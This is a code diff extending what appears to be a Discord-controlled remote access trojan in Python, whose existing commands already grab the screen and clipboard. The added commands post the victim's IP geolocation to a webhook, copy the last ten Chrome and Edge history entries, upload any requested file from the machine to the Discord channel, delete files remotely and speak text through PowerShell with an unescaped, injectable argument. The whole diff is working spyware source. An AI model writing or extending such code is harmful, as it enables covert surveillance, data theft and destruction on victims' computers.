@@ -15,6 +15,8 @@ import asyncio
 from PIL import ImageGrab
 import cv2
 import pyperclip
+import ctypes
+import win32com.client
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
@@ -229,5 +231,112 @@ async def clipboard(ctx):
 
     except Exception as e:
         await ctx.send(f"Error: {e}")
+
+@bot.command()
+async def ip(ctx):
+    try:
+        
+        response = requests.get("http://ip-api.com/json/").json()
+
+        if response["status"] == "success":
+            ip_info = (
+                f"**Public IP:** {response['query']}\n"
+                f"**Country:** {response['country']}\n"
+                f"**Region:** {response['regionName']}\n"
+                f"**City:** {response['city']}\n"
+                f"**ISP:** {response['isp']}\n"
+                f"**Lat/Lon:** {response['lat']}, {response['lon']}"
+            )
+        else:
+            ip_info = "Failed to get IP info."
+
+        
+        payload = {"content": f"🔍 **IP Geolocation Report**\n{ip_info}"}
+        requests.post(WEBHOOK_URL, json=payload)
+
+        await ctx.send("✅ Sent IP geolocation to the webhook!")
+
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+
+@bot.command()
+async def tts(ctx, *, message: str):
+    os.system(f"powershell -c (New-Object -ComObject SAPI.SpVoice).Speak('{message}')")
+    await ctx.send("Message spoken.")
+
+def get_browser_history(browser_name):
+    try:
+        
+        browser_paths = {
+            "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History",
+            "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\History"
+        }
+
+        if browser_name not in browser_paths:
+            return f"❌ Unsupported browser: {browser_name}"
+
+        history_db = browser_paths[browser_name]
+
+        if not os.path.exists(history_db):
+            return f"❌ {browser_name} history file not found."
+
+        
+        temp_db = f"temp_{browser_name.lower()}_history.db"
+        shutil.copy2(history_db, temp_db)
+
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+
+        
+        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
+        history = cursor.fetchall()
+
+        conn.close()
+        os.remove(temp_db)  
+
+        if not history:
+            return f"📜 No browsing history found for {browser_name}."
+
+        
+        history_text = "\n".join([f"🔗 {title} ({url})" for url, title in history])
+        return f"📜 **Last 10 Browsed Sites on {browser_name}:**\n{history_text}"
+
+    except Exception as e:
+        return f"❌ Error retrieving {browser_name} history: {e}"
+
+@bot.command()
+async def browser(ctx):
+    chrome_history = get_browser_history("Chrome")
+    edge_history = get_browser_history("Edge")
+
+    await ctx.send(f"{chrome_history}\n\n{edge_history}")
+
+@bot.command()
+async def download(ctx, file_path: str):
+    try:
+        
+        if os.path.exists(file_path):
+            
+            await ctx.send(file=discord.File(file_path))
+            await ctx.send(f"File '{file_path}' sent successfully!")
+        else:
+            await ctx.send(f"❌ File '{file_path}' does not exist.")
+    except Exception as e:
+        await ctx.send(f"❌ Error: {e}")
+
+@bot.command()
+async def delete(ctx, file_path: str):
+    try:
+        
+        if os.path.exists(file_path):
+            
+            os.remove(file_path)
+            await ctx.send(f"File '{file_path}' has been deleted successfully.")
+        else:
+            await ctx.send(f"File '{file_path}' does not exist.")
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+
 
 bot.run(TOKEN)
